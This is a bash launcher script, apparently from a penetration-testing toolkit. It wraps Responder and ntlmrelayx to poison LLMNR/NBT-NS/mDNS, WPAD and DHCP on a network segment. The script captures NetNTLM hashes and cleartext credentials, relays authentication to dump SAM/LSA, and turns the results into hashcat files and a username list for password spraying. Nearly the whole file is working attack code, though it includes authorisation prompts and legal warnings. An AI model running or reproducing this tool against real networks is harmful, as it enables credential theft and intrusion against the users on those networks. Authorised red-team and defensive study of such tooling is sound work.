#!/usr/bin/env bash
# =============================================================================
# responder_launcher.sh - LLMNR/NBT-NS/mDNS poisoner + credential capture
# =============================================================================
#
# Description
# -----------
# Wraps Responder (and optionally impacket-ntlmrelayx for SMB relay) so that
# every poisoning run is logged, scoped, and analysable afterwards:
#
#   * picks the right interface (or takes one explicitly)
#   * starts Responder in a session directory with a preserved log
#   * optionally runs ntlmrelayx alongside it and dumps SAM/LSA + hashes
#   * parses the captured log into hashcat/john-ready files, a username list
#     and a credential summary
#   * seals the session with the chain-of-custody hasher
#
# Modes
#   run      capture NetNTLMv1/v2 hashes and cleartext credentials (default)
#   relay    relay captured authentications to a target instead of cracking
#   analyse  parse an existing capture session produced by an earlier run
#   status   show what has been captured so far
#
# Author      : cyberdeck-arsenal contributors
# Version     : 1.0.0
# Dependencies: responder, python3; optional: impacket (ntlmrelayx),
#               hashcat/john for offline cracking, cyberdeck_common.sh
# Licence     : MIT - AUTHORISED TARGETS ONLY. Poisoning a network you do not
#               own is an offence (UK Computer Misuse Act 1990 s.1/s.3A).
#
# Usage
# -----
#   sudo ./responder_launcher.sh --iface eth0
#   sudo ./responder_launcher.sh --iface eth0 --wpad --dhcp --duration 3600
#   sudo ./responder_launcher.sh --relay --iface eth0 --relay-target 10.0.0.9
#   sudo ./responder_launcher.sh --analyse                  # parse latest session
#   ./responder_launcher.sh --help
# =============================================================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
if [[ -f "${SCRIPT_DIR}/../lib/cyberdeck_common.sh" ]]; then
    source "${SCRIPT_DIR}/../lib/cyberdeck_common.sh"
elif [[ -f /opt/cyberdeck-arsenal/lib/cyberdeck_common.sh ]]; then
    source /opt/cyberdeck-arsenal/lib/cyberdeck_common.sh
else
    echo "fatal: cyberdeck_common.sh not found" >&2
    exit 1
fi

cdeck::init "responder_launcher"

INSTALL_DIR="$(cdeck::conf_get general.install_dir /opt/cyberdeck-arsenal)"
CAPTURE_ROOT="${INSTALL_DIR}/captures/responder"
SESSION_DIR=""
IFACE=""
MODE="run"
DURATION=0
RELAY_TARGET=""
WPAD=0
DHCP=0
FINGERPRINT=0
VERBOSE=0
CONF_FILE=""
ANALYSE_DIR=""

usage() {
    cdeck::usage_header \
        "Responder launcher with session logging, relay mode and log analysis" \
        "$0 [--iface <iface>] [--wpad] [--dhcp] [--relay --relay-target <ip>] [--analyse [session]]" \
        "sudo $0 --iface eth0                          # capture hashes" \
        "sudo $0 --iface eth0 --wpad --dhcp             # full poisoning incl. WPAD" \
        "sudo $0 --relay --iface eth0 -t 10.0.0.9       # relay to an SMB target" \
        "$0 --analyse                                   # parse the latest session" \
        "$0 --status"
    cat <<EOF

${C_BOLD}OPTIONS${C_RESET}
  -i, --iface IF        interface to poison (default: the one on the default route)
  -m, --mode MODE       run | relay | analyse | status   (default: run)
  -t, --relay-target IP target for relay mode (repeatable: comma separated)
  --wpad                answer WPAD queries and serve a rogue proxy config
  --dhcp                answer DHCP (becomes the gateway: very intrusive)
  --fingerprint         fingerprint hosts before poisoning (slower start)
  --duration N          stop after N seconds (0 = until Ctrl-C)
  --conf FILE           use an existing Responder.conf instead of generating one
  -v, --verbose         echo the full Responder output as well as logging it
  --yes                 skip the authorisation prompt
  --help, -h            this help

${C_BOLD}WHAT GETS CAPTURED${C_RESET}
  ${CAPTURE_ROOT}/<timestamp>/
      responder.log        raw Responder output
      hashes_*.txt         hashcat-ready (mode 5600 NTLMv2, 5500 NTLMv1, 1000 NTLM)
      usernames.txt        unique accounts seen (for spraying)
      credentials.md       human-readable summary + next steps
      relay/               ntlmrelayx logs, dumps and hash files (relay mode)
      custody              hash manifest added on exit by evidence_hasher.py

${C_YELLOW}⚠  Responder poisons name resolution for everyone on the segment.${C_RESET}
  Get written authorisation, agree a time window, and tell the blue team if the
  engagement requires it - this looks exactly like a real attack on the wire.
EOF
}

# --------------------------------------------------------------------------- #
# Argument parsing
# --------------------------------------------------------------------------- #
while (( $# )); do
    case "$1" in
        --help|-h)        usage; exit 0 ;;
        --version|-V)     printf 'responder_launcher %s\n' "${CDECK_VERSION}"; exit 0 ;;
        -i|--iface)       shift; IFACE="${1:-}" ;;
        -m|--mode)        shift; MODE="${1:-run}" ;;
        -t|--relay-target) shift; RELAY_TARGET="${RELAY_TARGET}${RELAY_TARGET:+,}${1:-}" ;;
        --wpad)           WPAD=1 ;;
        --dhcp)           DHCP=1 ;;
        --fingerprint)    FINGERPRINT=1 ;;
        --duration)       shift; DURATION="${1:-0}" ;;
        --conf)           shift; CONF_FILE="${1:-}" ;;
        -v|--verbose)     VERBOSE=1 ;;
        --analyse)        MODE="analyse"; if [[ -n "${2:-}" && "${2:0:1}" != "-" ]]; then
                              ANALYSE_DIR="$2"; shift
                          fi ;;
        --status)         MODE="status" ;;
        --yes|-y)         export CDECK_ASSUME_YES=1 ;;
        analyse|status|run|relay) MODE="$1" ;;
        -*)               cdeck::error "unknown option: $1"; usage; exit 2 ;;
        *)                cdeck::warn "ignoring non-option argument: $1" ;;
    esac
    shift
done

# --------------------------------------------------------------------------- #
# Helpers
# --------------------------------------------------------------------------- #
latest_session() {
    [[ -d "${CAPTURE_ROOT}" ]] || return 1
    find "${CAPTURE_ROOT}" -maxdepth 1 -mindepth 1 -type d -printf '%T@ %p\n' 2>/dev/null \
        | sort -rn | head -1 | cut -d' ' -f2-
}

pick_interface() {
    local candidate
    candidate="$(cdeck::default_iface)"
    if [[ -n "${candidate}" && "${candidate}" != "lo" ]]; then
        printf '%s' "${candidate}"
        return 0
    fi
    # No default route: fall back to the configured primary interface
    candidate="$(cdeck::conf_get network.primary_interface "")"
    [[ -n "${candidate}" && -d "/sys/class/net/${candidate}" ]] && { printf '%s' "${candidate}"; return 0; }
    # Interface with a private IPv4 address but no default route
    while read -r candidate; do
        [[ "${candidate}" == "lo" ]] && continue
        printf '%s' "${candidate}"
        return 0
    done < <(cdeck::interfaces)
    return 1
}

require_responder() {
    RESPONDER_BIN="$(command -v responder || command -v Responder.py || true)"
    if [[ -z "${RESPONDER_BIN}" ]]; then
        cdeck::error "Responder is not installed"
        cdeck::info "install it with: sudo pacman -S responder"
        cdeck::info "or: pip install responder  (inside the cyberdeck venv)"
        exit 1
    fi
}

is_responder_conf() {
    # Responder's config location varies by packaging
    for path in /etc/responder/Responder.conf /usr/share/responder/Responder.conf \
                /opt/responder/Responder.conf; do
        [[ -f "${path}" ]] && { printf '%s' "${path}"; return 0; }
    done
    return 1
}

# --------------------------------------------------------------------------- #
# Status: summarise every session on disk
# --------------------------------------------------------------------------- #
show_status() {
    cdeck::banner "responder sessions" "${CAPTURE_ROOT}"
    if [[ ! -d "${CAPTURE_ROOT}" ]] || [[ -z "$(ls -A "${CAPTURE_ROOT}" 2>/dev/null)" ]]; then
        cdeck::info "no capture sessions recorded yet"
        cdeck::info "start one with: sudo $0 --iface <iface>"
        return 0
    fi
    printf '\n  %-20s %8s %8s %8s %s\n' "SESSION" "HASHES" "USERS" "CLEARTEXT" "STARTED"
    local dir hashes users cleartext started
    while read -r dir; do
        [[ -z "${dir}" ]] && continue
        hashes=0
        for file in "${dir}"/hashes_*.txt; do
            [[ -f "${file}" ]] || continue
            hashes=$(( hashes + $(grep -c "" "${file}" 2>/dev/null || echo 0) ))
        done
        users=0
        [[ -f "${dir}/usernames.txt" ]] && users="$(grep -c "" "${dir}/usernames.txt" 2>/dev/null || echo 0)"
        cleartext=0
        [[ -f "${dir}/cleartext.txt" ]] && cleartext="$(grep -c "" "${dir}/cleartext.txt" 2>/dev/null || echo 0)"
        started="$(basename "${dir}")"
        printf '  %-20s %8s %8s %8s %s\n' "${started}" "${hashes}" "${users}" "${cleartext}" \
            "$(stat -c %y "${dir}" 2>/dev/null | cut -d. -f1)"
    done < <(find "${CAPTURE_ROOT}" -maxdepth 1 -mindepth 1 -type d | sort)
    printf '\n  analyse a session with: %s --analyse <session-dir>\n\n' "$0"
}

# --------------------------------------------------------------------------- #
# Analysis: turn a Responder log into something usable
# --------------------------------------------------------------------------- #
analyse_session() {
    local session="${1:-}"
    [[ -z "${session}" ]] && session="$(latest_session)"

    if [[ -z "${session}" || ! -d "${session}" ]]; then
        cdeck::error "no session directory to analyse"
        cdeck::info "run a capture first, or pass a directory: $0 --analyse ${CAPTURE_ROOT}/<session>"
        return 1
    fi

    cdeck::banner "responder analysis" "$(basename "${session}")"
    local log=""
    for candidate in "${session}/responder.log" "${session}/Responder.log" "${session}"/*.log; do
        [[ -f "${candidate}" ]] && { log="${candidate}"; break; }
    done
    if [[ -z "${log}" ]]; then
        cdeck::error "no Responder log found in ${session}"
        return 1
    fi
    cdeck::info "parsing ${log}"

    python3 - "${session}" "${log}" <<'PYEOF'
"""Parse a Responder log into hash files, a username list and a summary."""
import re
import sys
from collections import Counter
from pathlib import Path

session = Path(sys.argv[1])
log = Path(sys.argv[2])
text = log.read_text(errors="replace")

# Responder writes hashes either as clean NTLMv2 lines or inside log lines such
# as: [SMB] NTLMv2-SSP Hash     : user::DOMAIN:challenge:response:blob
patterns = {
    "hashcat_5600_ntlmv2": re.compile(
        r"^(?P<user>[^:\s]+)::(?P<domain>[^:]*):(?P<chal>[0-9a-fA-F]{16}):"
        r"(?P<resp>[0-9a-fA-F]{32}):(?P<blob>[0-9a-fA-F]+)$"),
    "hashcat_5500_ntlmv1": re.compile(
        r"^(?P<user>[^:\s]+)::(?P<domain>[^:]*):(?P<lm>[0-9a-fA-F]{48}):"
        r"(?P<nt>[0-9a-fA-F]{48}):(?P<chal>[0-9a-fA-F]{16})$"),
    "hashcat_1000_ntlm": re.compile(r"^(?P<hash>[0-9a-fA-F]{32})$"),
}
inline = re.compile(r"(?:NTLMv2-SSP Hash|NTLMv1-SSP Hash|NTLM Hash)\s*:\s*(?P<hash>[^ \t]+)")

buckets = {name: [] for name in patterns}
usernames = Counter()
cleartext = []
hosts = Counter()
protocols = Counter()

for raw_line in text.splitlines():
    line = raw_line.strip()
    if not line:
        continue
    # Cleartext credentials (HTTP basic, form POSTs, LDAP simple bind, FTP...)
    if any(marker in line for marker in ("Username", "Password", "Cookie", "Form")):
        cleartext.append(re.sub(r"\s+", " ", line)[:200])
    for match in inline.finditer(line):
        candidate = match.group("hash")
        for name, pattern in patterns.items():
            if pattern.match(candidate) or (name == "hashcat_1000_ntlm"
                                           and re.fullmatch(r"[0-9a-fA-F]{32}", candidate)):
                buckets[name].append(candidate)
                # Pull the account out of the hash so it lands in usernames.txt
                account = candidate.split("::", 1)[0]
                if account and account.lower() not in ("", "aad3b435b51404eeaad3b435b51404ee"):
                    usernames[account] += 1
                break
    for name, pattern in patterns.items():
        match = pattern.match(line)
        if match:
            buckets[name].append(line)
            if "user" in match.groupdict():
                usernames[match.group("user")] += 1
            break
    # Responder tags every event with the protocol in brackets and usually the
    # peer address: "[SMB] NTLMv2-SSP Client   : 10.0.0.44" or
    # "[LLMNR]  Poisoned answer sent to 10.0.0.44 for name fileserver".
    tagged = re.match(r"\[(?P<proto>[^\]]+)\]\s+(?P<body>.*)", line)
    if tagged and re.fullmatch(r"[A-Za-z][A-Za-z0-9/_-]*", tagged.group("proto")):
        protocols[tagged.group("proto")] += 1
        peer = re.search(r"\b(?P<ip>\d{1,3}(?:\.\d{1,3}){3})\b", tagged.group("body"))
        if peer:
            hosts[peer.group("ip")] += 1

written = []
for name, entries in buckets.items():
    # de-duplicate while preserving order
    unique = list(dict.fromkeys(entries))
    if not unique:
        continue
    target = session / f"{name}.txt"
    target.write_text("\n".join(unique) + "\n")
    written.append((name, len(unique), target))

if usernames:
    (session / "usernames.txt").write_text(
        "\n".join(user for user, _ in usernames.most_common()) + "\n")
if cleartext:
    (session / "cleartext.txt").write_text("\n".join(cleartext) + "\n")

mode_hint = {
    "hashcat_5600_ntlmv2": "hashcat -m 5600",
    "hashcat_5500_ntlmv1": "hashcat -m 5500",
    "hashcat_1000_ntlm": "hashcat -m 1000",
}
lines = [
    "# Responder capture summary",
    "",
    f"* session: `{session.name}`",
    f"* parsed log: `{log.name}` ({len(text.splitlines())} lines)",
    f"* unique accounts seen: {len(usernames)}",
    f"* unique hosts seen: {len(hosts)}",
    f"* cleartext credential lines: {len(cleartext)}",
    "",
]
if protocols:
    lines += ["## protocols observed", ""]
    lines += [f"* {proto} - {count} event(s)" for proto, count in protocols.most_common()]
    lines.append("")
if hosts:
    lines += ["## hosts", ""]
    lines += [f"* {ip} - {count} event(s)" for ip, count in hosts.most_common(20)]
    lines.append("")
if written:
    lines += ["## captured hashes", ""]
    for name, count, target in written:
        lines.append(f"* `{target.name}` - {count} hash(es)")
        lines.append(f"  * crack with: `{mode_hint[name]} {target.name} "
                     f"/usr/share/wordlists/rockyou.txt`")
    lines.append("")
    lines += ["## accounts", ""]
    lines += [f"* {user} ({count})" for user, count in usernames.most_common(50)]
    lines.append("")
else:
    lines += ["## captured hashes", "",
              "No hashes were recovered in this session. Check that:",
              "* clients were actively resolving names (some networks are quiet at night)",
              "* SMB/HTTP servers are enabled in Responder.conf",
              "* IPv6 is not preferred on the segment (hosts may skip LLMNR entirely)", ""]
if cleartext:
    lines += ["## cleartext / verbose events", "",
              "```", *cleartext[:40], "```", ""]
lines += [
    "## next steps",
    "",
    "* Crack offline: `hashcat -m 5600 <file> <wordlist>` (add `-r` rules for better yield)",
    "* Spray the username list where lockout policy allows (check the policy first)",
    "* Record the finding for the report: NTLM relay freedom means SMB signing is off",
    "* Seal this directory: `python3 recon/reporting/evidence_hasher.py " + str(session) + "`",
    "",
]
(session / "credentials.md").write_text("\n".join(lines))

print(f"  hashes written : {sum(count for _, count, _ in written)}")
print(f"  accounts seen  : {len(usernames)}")
print(f"  hosts seen     : {len(hosts)}")
print(f"  cleartext lines: {len(cleartext)}")
PYEOF
    local status=$?
    if (( status == 0 )); then
        cdeck::ok "analysis complete: ${session}/credentials.md"
        [[ -f "${session}/cleartext.txt" ]] && \
            cdeck::alert "cleartext credentials were captured - handle as personal data"
    else
        cdeck::error "analysis failed (parser exited ${status})"
    fi

    # Hash the derived files so the evidence trail covers the analysis too
    seal_session "${session}"
    return "${status}"
}

seal_session() {
    local session="$1"
    local hasher="${SCRIPT_DIR}/../recon/reporting/evidence_hasher.py"
    [[ -f "${hasher}" ]] || { cdeck::debug "evidence_hasher.py not present - skipping seal"; return 0; }
    command -v python3 >/dev/null 2>&1 || return 0
    cdeck::info "sealing session into the chain-of-custody log"
    if python3 "${hasher}" "${session}" --note "responder session $(basename "${session}")" \
            >/dev/null 2>&1; then
        cdeck::ok "custody log updated"
    else
        cdeck::warn "could not update the custody log - run: cdeck hash ${session}"
    fi
}

# --------------------------------------------------------------------------- #
# Relay mode: push captured authentications at a target
# --------------------------------------------------------------------------- #
run_relay() {
    local relay_bin=""
    for candidate in impacket-ntlmrelayx ntlmrelayx.py; do
        command -v "${candidate}" >/dev/null 2>&1 && { relay_bin="${candidate}"; break; }
    done
    if [[ -z "${relay_bin}" ]]; then
        cdeck::error "impacket is required for relay mode (pacman -S impacket)"
        return 1
    fi
    if [[ -z "${RELAY_TARGET}" ]]; then
        cdeck::error "relay mode needs a target: --relay-target <ip>[,<ip>...]"
        return 2
    fi

    local relay_dir="${SESSION_DIR}/relay"
    mkdir -p "${relay_dir}"
    cdeck::banner "NTLM relay" "target: ${RELAY_TARGET}"
    cdeck::legal_warning "relaying authentications to ${RELAY_TARGET}"
    cdeck::warn "relay succeeds only where SMB signing is not required"
    cdeck::confirm "Confirm you are authorised to relay to ${RELAY_TARGET}?" n || {
        cdeck::error "not authorised - aborting relay"
        return 1
    }

    local args=(-t "${RELAY_TARGET}" -smb2support -of "${relay_dir}/relay_hashes"
                -l "${relay_dir}/loot" -w)
    # Disable the protocols Responder keeps (it only poisons; relay does the work)
    RESPONDER_DISABLE="-r -d -w"

    cdeck::info "starting ${relay_bin} ${args[*]}"
    "${relay_bin}" "${args[@]}" > "${relay_dir}/ntlmrelayx.log" 2>&1 &
    local relay_pid=$!
    echo "${relay_pid}" > "${relay_dir}/relay.pid"
    sleep 2
    if ! kill -0 "${relay_pid}" 2>/dev/null; then
        cdeck::error "relay tool exited immediately - see ${relay_dir}/ntlmrelayx.log"
        tail -5 "${relay_dir}/ntlmrelayx.log" 2>/dev/null | sed 's/^/    /'
        return 1
    fi
    cdeck::ok "relay listener running (pid ${relay_pid})"
    cdeck::info "dumps and hashes appear in ${relay_dir}/ as accounts authenticate"
    return 0
}

# --------------------------------------------------------------------------- #
# Capture mode: poisoning + optional relay
# --------------------------------------------------------------------------- #
run_capture() {
    require_responder

    if [[ -z "${IFACE}" ]]; then
        IFACE="$(pick_interface)"
        cdeck::warn "no interface given - using ${IFACE:-none}"
    fi
    if [[ -z "${IFACE}" || ! -d "/sys/class/net/${IFACE}" ]]; then
        cdeck::error "interface not found: ${IFACE:-<none>}"
        cdeck::info "available: $(cdeck::interfaces | tr '\n' ' ')"
        return 2
    fi

    cdeck::banner "responder" "${IFACE} $(cdeck::iface_mac "${IFACE}")"
    cdeck::legal_warning "poisoning name resolution on ${IFACE}"
    if (( DHCP )); then
        cdeck::alert "DHCP mode hands us the default gateway for every client"
    fi
    if (( WPAD )); then
        cdeck::alert "WPAD mode serves a proxy autoconfig file - victims' web traffic is ours"
    fi
    cdeck::confirm "Confirm you have written authorisation for this network?" n || {
        cdeck::error "aborted at the authorisation prompt"
        return 1
    }

    # --- session directory -------------------------------------------------- #
    mkdir -p "${CAPTURE_ROOT}"
    chmod 0700 "${CAPTURE_ROOT}"
    SESSION_DIR="${CAPTURE_ROOT}/$(cdeck::stamp)"
    mkdir -p "${SESSION_DIR}/relay"
    chmod 0700 "${SESSION_DIR}"
    {
        printf 'interface   : %s\n' "${IFACE}"
        printf 'mac         : %s\n' "$(cdeck::iface_mac "${IFACE}")"
        printf 'ipv4        : %s\n' "$(ip -4 -o addr show "${IFACE}" 2>/dev/null | awk '{print $4}' | paste -sd, -)"
        printf 'gateway     : %s\n' "$(ip route show default dev "${IFACE}" 2>/dev/null | awk '/default/ {print $3; exit}')"
        printf 'ssid        : %s\n' "$(iw dev "${IFACE}" info 2>/dev/null | awk '/ssid/ {print $2}')"
        printf 'wpad        : %s\n' "${WPAD}"
        printf 'dhcp        : %s\n' "${DHCP}"
        printf 'fingerprint : %s\n' "${FINGERPRINT}"
        printf 'mode        : %s\n' "${MODE}"
        printf 'operator    : %s\n' "$(cdeck::conf_get general.operator_name operator)"
        printf 'started     : %s\n' "$(date -Is)"
    } > "${SESSION_DIR}/session.txt"
    cdeck::ok "session directory: ${SESSION_DIR}"

    # --- configuration ------------------------------------------------------ #
    local responder_conf="${CONF_FILE}"
    if [[ -z "${responder_conf}" ]]; then
        responder_conf="$(is_responder_conf)"
        if [[ -z "${responder_conf}" ]]; then
            cdeck::warn "no system Responder.conf found - Responder will use its built-in defaults"
            cdeck::info "for fine-grained control copy one to /etc/responder/Responder.conf"
        else
            cdeck::info "using Responder config: ${responder_conf}"
        fi
    fi

    # --- optional relay component ------------------------------------------ #
    if [[ "${MODE}" == "relay" ]]; then
        if ! run_relay; then
            cdeck::error "relay setup failed - falling back to capture-only mode"
            MODE="run"
        fi
    fi

    # --- build the Responder command line ---------------------------------- #
    local responder_args=(-I "${IFACE}" -v -o -w -F)
    (( DHCP )) && responder_args+=(-d)
    (( WPAD )) && responder_args+=(-W)
    (( FINGERPRINT )) && responder_args+=(-f)
    # Relay mode: let ntlmrelayx own the servers, keep Responder as the poisoner
    [[ "${MODE}" == "relay" ]] && responder_args+=(-r -d -w)
    [[ -n "${responder_conf}" ]] && responder_args+=(-c "${responder_conf}")

    cdeck::info "starting: $(basename "${RESPONDER_BIN}") ${responder_args[*]}"
    cdeck::warn "leave this running while clients resolve names; Ctrl-C stops it cleanly"

    # --- run --------------------------------------------------------------- #
    local responder_pid=""
    local log_file="${SESSION_DIR}/responder.log"
    if (( DURATION > 0 )); then
        cdeck::info "capturing for ${DURATION}s"
        timeout --signal=INT "${DURATION}" "${RESPONDER_BIN}" "${responder_args[@]}" \
            > "${log_file}" 2>&1 &
        responder_pid=$!
    else
        "${RESPONDER_BIN}" "${responder_args[@]}" > "${log_file}" 2>&1 &
        responder_pid=$!
    fi
    echo "${responder_pid}" > "${SESSION_DIR}/responder.pid"

    sleep 3
    if ! kill -0 "${responder_pid}" 2>/dev/null; then
        cdeck::error "Responder exited immediately"
        cdeck::info "last lines of the log:"
        tail -10 "${log_file}" 2>/dev/null | sed 's/^/    /'
        cdeck::info "common causes: needs root, wrong interface, port 445/139 already in use"
        return 1
    fi
    cdeck::ok "Responder running (pid ${responder_pid})"

    # --- supervision loop -------------------------------------------------- #
    local live_log="/tmp/cdeck-responder-live-$$"
    tail -n 0 -f "${log_file}" > "${live_log}" 2>/dev/null &
    local tail_pid=$!

    trap 'cdeck::info "stopping capture"; kill -INT "${responder_pid}" 2>/dev/null || true; \
          [[ -n "${tail_pid:-}" ]] && kill "${tail_pid}" 2>/dev/null || true; \
          STOPPED=1' INT TERM

    local STOPPED=0
    while (( STOPPED == 0 )); do
        if ! kill -0 "${responder_pid}" 2>/dev/null; then
            cdeck::info "Responder stopped on its own"
            break
        fi
        if (( VERBOSE )); then
            tail -n 3 "${log_file}" 2>/dev/null | sed 's/^/    /'
        fi
        # Live counter of captured hashes
        local captured
        captured="$(grep -cE "NTLMv2-SSP Hash|NTLMv1-SSP Hash|NTLM Hash" "${log_file}" 2>/dev/null || echo 0)"
        printf '\r  %s hashes captured · %s · Ctrl-C to stop   ' \
            "${captured}" "$(cdeck::human_duration 0 2>/dev/null || echo running)"
        sleep 5
    done
    printf '\r%s\r' "                                                        "

    kill -INT "${responder_pid}" 2>/dev/null || true
    sleep 2
    [[ -n "${tail_pid:-}" ]] && kill "${tail_pid}" 2>/dev/null || true
    rm -f "${live_log}"

    # Stop a relay process if one is running
    if [[ -f "${SESSION_DIR}/relay/relay.pid" ]]; then
        local relay_pid; relay_pid="$(cat "${SESSION_DIR}/relay/relay.pid")"
        kill -TERM "${relay_pid}" 2>/dev/null || true
        cdeck::info "relay tool stopped"
    fi

    # --- restore the environment ------------------------------------------- #
    cdeck::info "flushing the network state Responder changed"
    cdeck::kill_processes "Responder.py" "responder" "ntlmrelayx.py" || true

    # --- analyse and seal -------------------------------------------------- #
    analyse_session "${SESSION_DIR}" || true
    printf '\n'
    cdeck::ok "session complete"
    printf '  %-14s %s\n' "log"  "${SESSION_DIR}/responder.log"
    printf '  %-14s %s\n' "hashes" "${SESSION_DIR}/hashes_*.txt"
    printf '  %-14s %s\n' "summary" "${SESSION_DIR}/credentials.md"
    printf '\n'
    cdeck::info "crack with: hashcat -m 5600 ${SESSION_DIR}/hashcat_5600_ntlmv2.txt \\"
    cdeck::info "                 ${INSTALL_DIR}/data/wordlists/rockyou.txt"
    return 0
}

# --------------------------------------------------------------------------- #
# Main
# --------------------------------------------------------------------------- #
case "${MODE}" in
    analyse)
        analyse_session "${ANALYSE_DIR}"; exit $?
        ;;
    status)
        show_status; exit 0
        ;;
    run|relay)
        cdeck::require_root "credential capture" || exit 1
        cdeck::require_acknowledgement || exit 1
        run_capture; exit $?
        ;;
    *)
        cdeck::error "unknown mode: ${MODE}"
        usage
        exit 2
        ;;
esac
